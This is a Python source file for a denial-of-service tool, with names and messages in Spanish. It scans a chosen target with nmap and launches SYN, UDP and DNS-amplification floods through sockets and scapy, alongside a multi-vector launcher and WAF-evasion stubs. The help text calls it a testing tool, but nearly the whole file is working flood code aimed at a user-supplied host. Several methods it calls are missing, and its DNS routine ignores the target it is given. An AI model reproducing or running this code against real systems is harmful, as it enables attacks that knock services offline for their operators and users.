import socket
import threading
import random
import time
import multiprocessing
import requests
import logging
import argparse
import json
import sys
import nmap
import cryptography
import schedule
from datetime import datetime
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict
from scapy.all import *
from colorama import init, Fore
from tqdm import tqdm

class AtaqueDDOSPro:
    def __init__(self, config_file: str = 'config.json'):
        self.conexiones_exitosas = 0
        self.conexiones_fallidas = 0
        self.activo = True
        self.ua = UserAgent()
        self.sesion = requests.Session()
        self.modo_sigiloso = True
        self.bandwidth_limit = None
        self.objetivos = []
        self.proxies = self.cargar_proxies()
        self.configuracion = self.cargar_configuracion(config_file)
        self.inicializar_logger()

    def cargar_configuracion(self, config_file: str) -> Dict:
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return self.crear_configuracion_default()

    def inicializar_logger(self):
        self.logger = logging.getLogger('AtaqueDDOS')
        self.logger.setLevel(logging.INFO)
        handler = logging.FileHandler('ataque_ddos.log', encoding='utf-8')
        handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        self.logger.addHandler(handler)

    def verificar_objetivo(self, objetivo: str) -> Dict:
        """Análisis completo del objetivo"""
        resultados = {
            'puertos_abiertos': [],
            'waf_detectado': False,
            'vulnerabilidades': [],
            'servicios': []
        }

        nm = nmap.PortScanner()
        nm.scan(objetivo, arguments='-sS -sV -A')

        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                puertos = nm[host][proto].keys()
                for puerto in puertos:
                    resultados['puertos_abiertos'].append(puerto)
                    servicio = nm[host][proto][puerto]
                    resultados['servicios'].append({
                        'puerto': puerto,
                        'nombre': servicio['name'],
                        'version': servicio['version']
                    })

        return resultados

    def ataque_udp_flood(self, objetivo: str, puerto: int):
        while self.activo:
            try:
                bytes_datos = random._urandom(1024)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(bytes_datos, (objetivo, puerto))
                self.conexiones_exitosas += 1
            except:
                self.conexiones_fallidas += 1

    def ataque_dns_amplification(self, objetivo: str):
        dns_servers = self.obtener_dns_servers()
        while self.activo:
            try:
                for dns in dns_servers:
                    pkt = IP(dst=dns)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="google.com"))
                    send(pkt, verbose=0)
                    self.conexiones_exitosas += 1
            except:
                self.conexiones_fallidas += 1

    def ataque_syn_flood_avanzado(self, objetivo: str, puerto: int):
        while self.activo:
            try:
                IP_paquete = IP(dst=objetivo)
                TCP_paquete = TCP(sport=RandShort(), dport=puerto, flags="S")
                paquete = IP_paquete / TCP_paquete
                send(paquete, verbose=0)
                self.conexiones_exitosas += 1
            except:
                self.conexiones_fallidas += 1

    def iniciar_ataque_distribuido(self, objetivo: str, puerto: int, tipo_ataque: str):
        """Iniciar ataque distribuido con múltiples vectores"""
        vectores_ataque = {
            'syn': self.ataque_syn_flood_avanzado,
            'udp': self.ataque_udp_flood,
            'dns': self.ataque_dns_amplification,
            'http': self.inundacion_http,
            'slowloris': self.ataque_slowloris
        }

        # Distribuir carga entre vectores
        for vector in vectores_ataque.values():
            threading.Thread(target=vector, args=(objetivo, puerto)).start()

    def generar_reporte(self):
        """Genera reporte detallado del ataque"""
        reporte = {
            'timestamp': datetime.now().isoformat(),
            'estadisticas': {
                'conexiones_exitosas': self.conexiones_exitosas,
                'conexiones_fallidas': self.conexiones_fallidas,
                'tasa_exito': self.calcular_tasa_exito()
            },
            'objetivos': self.objetivos,
            'duracion_ataque': self.tiempo_transcurrido
        }

        with open(f'reporte_ataque_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json', 'w') as f:
            json.dump(reporte, f, indent=4)

    def modo_evasion_waf(self):
        """Implementa técnicas de evasión de WAF"""
        tecnicas_evasion = [
            self.rotacion_user_agents,
            self.rotacion_headers,
            self.fragmentacion_paquetes,
            self.ofuscacion_payload
        ]

        for tecnica in tecnicas_evasion:
            threading.Thread(target=tecnica).start()

def main():
    init()  # Inicializar colorama
    parser = argparse.ArgumentParser(description='Herramienta Profesional de Pruebas DDOS')
    parser.add_argument('-o', '--objetivo', required=True, help='IP/Dominio objetivo')
    parser.add_argument('-p', '--puerto', type=int, default=80, help='Puerto objetivo')
    parser.add_argument('-w', '--workers', type=int, default=multiprocessing.cpu_count() * 4, help='Número de hilos')
    parser.add_argument('-m', '--metodo', choices=['syn', 'http', 'slowloris', 'udp', 'dns'], default='http', help='Método de ataque')
    parser.add_argument('--distribuido', action='store_true', help='Modo de ataque distribuido')
    parser.add_argument('--sigiloso', action='store_true', help='Modo sigiloso')

    args = parser.parse_args()

    atacante = AtaqueDDOSPro()

    print(Fore.GREEN + "[*] Iniciando análisis del objetivo...")
    resultados_analisis = atacante.verificar_objetivo(args.objetivo)

    if not resultados_analisis['puertos_abiertos']:
        print(Fore.RED + "[!] No se encontraron puertos abiertos en el objetivo")
        sys.exit(1)

    print(Fore.YELLOW + "\nResultados del análisis:")
    print(f"Puertos abiertos: {resultados_analisis['puertos_abiertos']}")
    print(f"Servicios detectados: {len(resultados_analisis['servicios'])}")

    confirmacion = input(Fore.WHITE + "\n¿Desea continuar con el ataque? (s/n): ")
    if confirmacion.lower() != 's':
        sys.exit(0)

    with tqdm(total=100, desc="Preparando ataque") as pbar:
        if args.distribuido:
            atacante.iniciar_ataque_distribuido(args.objetivo, args.puerto, args.metodo)
        else:
            atacante.iniciar_ataque(args.objetivo, args.puerto, args.workers, args.metodo)
        pbar.update(100)

if __name__ == "__main__":
    main()
